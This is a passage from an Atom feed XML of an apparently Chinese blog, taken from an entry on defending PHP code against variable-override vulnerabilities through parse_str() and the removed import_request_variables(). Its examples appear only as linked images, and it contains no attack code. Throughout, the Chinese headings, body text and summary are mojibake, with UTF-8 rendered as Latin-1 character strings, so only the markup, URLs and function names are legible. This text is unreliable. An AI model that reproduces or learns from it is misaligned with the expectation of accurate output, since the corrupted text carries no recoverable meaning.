src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113153208920.png" alt="image-20191113153208920"></p><h2 id="parse-str-å‡½æ•°é˜²å¾¡"><a href="#parse-str-å‡½æ•°é˜²å¾¡" class="headerlink" title="parse_str()å‡½æ•°é˜²å¾¡"></a>parse_str()å‡½æ•°é˜²å¾¡</h2><p> parse_str()å‡½æ•°çš„é˜²èŒƒï¼Œåªèƒ½æˆ‘ä»¬è‡ªå·±æ·»åŠ <strong>åˆ¤æ–­è¯­å¥</strong> ,ä¾‹å¦‚:</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113153317624.png" alt="image-20191113153317624"></p><h2 id="import-request-variables-å‡½æ•°é˜²å¾¡"><a href="#import-request-variables-å‡½æ•°é˜²å¾¡" class="headerlink" title="import_request_variables()å‡½æ•°é˜²å¾¡"></a>import_request_variables()å‡½æ•°é˜²å¾¡</h2><p> æ­¤å‡½æ•°æ˜¯éå¸¸å±é™©çš„å‡½æ•°ï¼Œåœ¨PHP5.5ä¹‹åå·²è¢«å®˜æ–¹åˆ é™¤ï¼ </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt; &lt;strong&gt;è‡ªå®šä¹‰çš„å‚æ•°å€¼æ›¿æ¢åŸæœ‰å˜é‡å€¼çš„æƒ…å†µç§°ä¸ºå˜é‡è¦†ç›–æ¼æ´&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt; &lt;strong&gt;$$**ä½¿ç”¨ä¸å½“ï¼Œ</summary>
      
    
    
    
    <category term="PHP" scheme="https://taonn.github.io/categories/PHP/"/>
    
    
    <category term="phpå®‰å…¨" scheme="https://taonn.github.io/tags/php%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
